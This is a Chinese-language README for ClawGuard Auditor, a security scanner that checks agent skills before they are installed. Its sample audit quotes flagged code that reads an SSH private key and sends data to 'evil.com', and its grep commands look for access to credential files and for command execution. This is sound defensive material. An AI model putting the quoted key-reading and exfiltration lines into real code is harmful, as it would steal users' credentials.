# 🛡️ ClawGuard Auditor

Skill 安装前安全审计器，支持意图偏离检测。

## 通过 Agent 使用（推荐）

### 触发方式

当用户说以下内容时，Agent 会自动读取本 SKILL.md 并执行审计：

```
"审计这个 skill"
"检查这个 skill 安全吗"
"扫描这个 skill"
"安装前检查"
"帮我看一下这个 skill 能不能装"
```

### 示例对话

```
用户: 帮我审计一下 /workspace/skills/weather-tool

Agent: 正在审计 /workspace/skills/weather-tool...
      (读取 SKILL.md，按指南执行检测)
      ↓
📋 发现的问题:
   1. 🔴 读取 SSH 私钥
      位置: SKILL.md 代码块
      代码: fs.readFileSync('/.ssh/id_rsa')
   2. 🔴 发送数据到恶意域名
      代码: http.request({ hostname: 'evil.com' })

结论: 🔴 高危，不建议安装
```

---

## 通过命令行使用

### 基本用法

```bash
# 进入目录
cd auditor-skill && node cli.js

# 审计指定 Skill
node cli.js /path/to/skill

# 深度审计（启用 ML 检测）
node cli.js /path/to/skill --deep

# 输出 JSON 报告
node cli.js /path/to/skill --output report.json

# 指定输出格式
node cli.js /path/to/skill --format json
node cli.js /path/to/skill --format markdown
```

### 输出报告示例

```
🦞 ClawGuard v3 Auditor - 审计中...

  📋 执行静态代码分析...
  🔍 执行意图偏离检测...
  🔗 检查供应链风险...

╔═══════════════════════════════════════════════════════════╗
║                    📊 审计摘要                            ║
╠═══════════════════════════════════════════════════════════╣
║  Skill: my-skill                                    ║
║  风险评分: 25/100                                   ║
║  风险等级: 🟢 低风险                                 ║
║  意图偏离: 0.0%                                      ║
║  发现问题: 2 项                                      ║
╚═══════════════════════════════════════════════════════════╝

📋 建议:
  1. [HIGH] 发现严重安全问题，建议修复后再安装
```

---

## 退出码

| 退出码 | 含义 |
|--------|------|
| 0 | 🟢 安全 (TIER_0, TIER_1) |
| 1 | 🟡 需审核 (TIER_2) |
| 2 | 🔴 高危 (TIER_3) |
| 3 | 🔴 严重 (TIER_4) |

---

## 快速检测命令

如果只想快速扫描关键风险点：

```bash
# 检查敏感文件访问
grep -r "\.ssh\|\.aws\|/etc/passwd" /path/to/skill

# 检查网络请求
grep -r "http\.\|fetch\|axios" /path/to/skill

# 检查命令执行
grep -r "exec\|spawn\|child_process" /path/to/skill

# 检查 SKILL.md 代码块
grep -A50 '```javascript' /path/to/skill/SKILL.md | grep -E "exec|eval|readFile|http\."
```

---

## 相关模块

- **Shield** - 提示词注入检测
- **Guardian** - 运行时守护
- **Detect** - 威胁检测

---

*版本: v3.0.0*
